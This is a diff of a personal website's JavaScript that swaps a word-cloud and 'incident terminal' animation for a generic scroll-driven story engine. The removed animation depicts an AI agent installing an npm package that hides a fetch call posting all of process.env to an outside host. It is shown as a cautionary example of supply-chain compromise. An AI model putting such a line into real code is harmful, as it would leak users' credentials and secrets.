@@ -1,131 +1,98 @@
-// ---------- word cloud ----------
-// Grey words scattered around; the red ones light up in reading order as you scroll.
-const filler = [
-  'curiosity', 'friends', 'stories', 'gardens', 'math', 'kindness', 'teaching', 'questions',
-  'logs', 'clusters', 'packages', 'models', 'security', 'late nights', 'San Jose', 'Pune',
-  'puzzles', 'people', 'notebooks', 'patience', 'debugging', 'small details', 'why?', 'how?',
-  'learning', 'hackathons', 'weekends', 'trust', 'surprises', 'good docs'
-];
-// focus words, placed roughly left-to-right, top-to-bottom so they read as a sentence
-const focus = [
-  ['I', 12, 16], ['like', 30, 28], ['understanding', 56, 14], ['how things', 82, 28],
-  ['actually', 22, 60], ['work', 44, 72], ['before', 64, 56], ['I trust them.', 82, 82]
-];
+// ============================================================
+// Scroll story engine
+// Each .scene is pinned while you scroll through it. Its words light up
+// one by one, and illustration parts marked data-at="0..1" switch on
+// once the scene's progress passes that point.
+// ============================================================
+(() => {
+  const root = document.documentElement;
+  root.classList.add('js');
+  const reduced = matchMedia('(prefers-reduced-motion: reduce)').matches;
 
-const cloud = document.getElementById('cloud');
-const line = document.getElementById('cloud-line');
-const small = window.innerWidth < 700;
+  // ---------- theme ----------
+  document.getElementById('theme').addEventListener('click', () => {
+    const next = root.dataset.theme === 'dark' ? 'light' : 'dark';
+    root.dataset.theme = next;
+    localStorage.setItem('theme', next);
+  });
 
-// deterministic pseudo-random so the layout is the same every visit
-let seed = 7;
-const rand = () => (seed = (seed * 9301 + 49297) % 233280) / 233280;
+  // ---------- split story text into words ----------
+  function splitWords(node) {
+    [...node.childNodes].forEach(child => {
+      if (child.nodeType === 3) {
+        const frag = document.createDocumentFragment();
+        child.textContent.split(/(\s+)/).forEach(part => {
+          if (!part) return;
+          if (/^\s+$/.test(part)) { frag.appendChild(document.createTextNode(part)); return; }
+          const s = document.createElement('span');
+          s.className = 'w';
+          s.textContent = part;
+          frag.appendChild(s);
+        });
+        child.replaceWith(frag);
+      } else if (child.nodeType === 1) {
+        splitWords(child);
+      }
+    });
+  }
 
-const taken = focus.map(([, x, y]) => [x, y]);
-const free = (x, y) => taken.every(([a, b]) => Math.abs(a - x) > (small ? 22 : 12) || Math.abs(b - y) > 8);
-filler.slice(0, small ? 16 : filler.length).forEach(word => {
-  let x, y, tries = 0;
-  do { x = 6 + rand() * 88; y = 4 + rand() * 92; } while (!free(x, y) && ++tries < 60);
-  taken.push([x, y]);
-  const el = document.createElement('span');
-  el.className = 'w';
-  el.textContent = word;
-  el.style.left = x + '%';
-  el.style.top = y + '%';
-  el.style.fontSize = (small ? 0.95 : 1.1) + rand() * (small ? 0.6 : 1.1) + 'rem';
-  cloud.appendChild(el);
-});
-const focusEls = focus.map(([word, x, y]) => {
-  const el = document.createElement('span');
-  el.className = 'w';
-  el.textContent = word;
-  el.style.left = x + '%';
-  el.style.top = y + '%';
-  el.style.fontSize = small ? '1.6rem' : '2.6rem';
-  cloud.appendChild(el);
-  return el;
-});
+  // draw-on paths: normalise length so CSS can animate 1 → 0
+  document.querySelectorAll('.draw').forEach(p => p.setAttribute('pathLength', '1'));
 
-// ---------- incident terminal ----------
-const screen = document.getElementById('screen');
-const stamp = document.getElementById('stamp');
-const lookBtn = document.getElementById('look');
-const frames = [
-  `<span class="dim">agent ›</span> I need something to format dates.
-<span class="dim">agent ›</span> searching packages…`,
-  `<span class="dim">agent ›</span> I need something to format dates.
-<span class="dim">agent ›</span> searching packages…
-<span class="dim">agent ›</span> found <b>tiny-dates</b> · 4,212 weekly downloads
-<span class="dim">$</span> npm install tiny-dates
-<span class="ok">✓ added 1 package in 1.2s</span>`,
-  `<span class="dim">// tiny-dates/index.js</span>
-export function format(d) {
-  return d.toLocaleDateString();
-}
+  const scenes = [...document.querySelectorAll('.scene')].map(el => {
+    el.querySelectorAll('.story').forEach(splitWords);
+    const words = [...el.querySelectorAll('.story .w')];
+    const parts = [...el.querySelectorAll('[data-at]')].map(n => ({ n, at: +n.dataset.at }));
+    const scrub = el.querySelector('.scrub');
+    // longer paragraphs get a little more scroll room
+    el.style.height = `${Math.max(190, 110 + words.length * 2.1)}vh`;
+    return { el, words, parts, scrub, lit: -1 };
+  });
 
-<span class="dim">// … 300 more lines …</span>`,
-  `<span class="dim">// tiny-dates/index.js</span>
-export function format(d) {
-  return d.toLocaleDateString();
-}
+  document.getElementById('chapters').textContent = String(scenes.length).padStart(2, '0');
+  const chapterEl = document.getElementById('chapter');
+  const bar = document.getElementById('progress');
 
-<span class="dim">// … 300 more lines …</span>
-<span class="bad">fetch("https://x9-cdn.io/c", {
-  method: "POST",
-  body: JSON.stringify(process.env)
-});</span>`
-];
+  function update() {
+    const vh = innerHeight;
+    let active = 0;
+    scenes.forEach((s, i) => {
+      const r = s.el.getBoundingClientRect();
+      const span = r.height - vh;
+      const p = reduced ? 1 : Math.min(1, Math.max(0, -r.top / span));
+      if (r.top <= vh * .5) active = i;
 
-const beats = [...document.querySelectorAll('.beat')];
-let opened = false;
-let current = -1;
-function showBeat(i) {
-  if (i === current) return;
-  current = i;
-  beats.forEach((b, j) => b.classList.toggle('on', j === i));
-  screen.innerHTML = frames[i];
-  stamp.classList.toggle('on', i === 3);
-}
+      // words light up over the first 75% of the scene, leaving a beat to rest
+      const lit = Math.round(Math.min(1, p / .75) * s.words.length);
+      if (lit !== s.lit) {
+        s.words.forEach((w, j) => w.classList.toggle('lit', j < lit));
+        s.lit = lit;
+      }
+      s.parts.forEach(({ n, at }) => n.classList.toggle('on', p >= at || (at === 0 && r.top < vh)));
+      if (s.scrub) s.scrub.style.strokeDashoffset = 1 - Math.min(1, p / .7);
+    });
+    chapterEl.textContent = String(active + 1).padStart(2, '0');
+    const max = root.scrollHeight - vh;
+    bar.style.transform = `scaleX(${max > 0 ? scrollY / max : 0})`;
+  }
 
-lookBtn.addEventListener('click', () => {
-  opened = true;
-  showBeat(3);
-  // nudge the page so the last beat stays in view as the reader continues
-  const sec = document.querySelector('.incident');
-  const target = sec.offsetTop + (sec.offsetHeight - innerHeight) * 0.8;
-  if (scrollY < target) window.scrollTo({ top: target, behavior: 'smooth' });
-});
+  let ticking = false;
+  addEventListener('scroll', () => {
+    if (!ticking) { ticking = true; requestAnimationFrame(() => { update(); ticking = false; }); }
+  }, { passive: true });
+  addEventListener('resize', update);
+  update();
 
-// ---------- scroll driver for the pinned scenes ----------
-const progress = el => {
-  const r = el.getBoundingClientRect();
-  return Math.min(1, Math.max(0, -r.top / (r.height - innerHeight)));
-};
-const cloudSec = document.querySelector('.cloud-wrap');
-const incSec = document.querySelector('.incident');
+  // ---------- gentle reveals after the story ----------
+  const revealables = document.querySelectorAll('.made-head, .card, .papers, .thanks > *');
+  revealables.forEach((el, i) => {
+    el.classList.add('reveal-up');
+    if (el.classList.contains('card')) el.style.transitionDelay = `${(i % 3) * 80}ms`;
+  });
+  const io = new IntersectionObserver(es => es.forEach(e => {
+    if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
+  }), { threshold: .12 });
+  revealables.forEach(el => (reduced ? el.classList.add('in') : io.observe(el)));
 
-function onScroll() {
-  // cloud: light words one by one between 10% and 70%, then show the sentence
-  const p = progress(cloudSec);
-  const lit = Math.floor((p - 0.08) / 0.62 * focusEls.length);
-  focusEls.forEach((el, i) => el.classList.toggle('on', i < lit));
-  cloud.classList.toggle('dim', lit > 0);
-  line.classList.toggle('show', p > 0.74);
-
-  // incident: four beats; the last one only scrolls in once the reader has looked
-  const q = progress(incSec);
-  let beat = q < 0.22 ? 0 : q < 0.5 ? 1 : 2;
-  if (q > 0.75 || opened) beat = Math.max(beat, q > 0.75 ? 3 : 2);
-  if (opened && q > 0.5) beat = 3;
-  showBeat(beat);
-}
-addEventListener('scroll', onScroll, { passive: true });
-addEventListener('resize', onScroll);
-onScroll();
-
-// ---------- gentle reveals ----------
-const io = new IntersectionObserver(es => es.forEach(e => {
-  if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
-}), { threshold: 0.15 });
-document.querySelectorAll('.reveal').forEach(el => io.observe(el));
-
-document.getElementById('year').textContent = new Date().getFullYear();
+  document.getElementById('year').textContent = new Date().getFullYear();
+})();
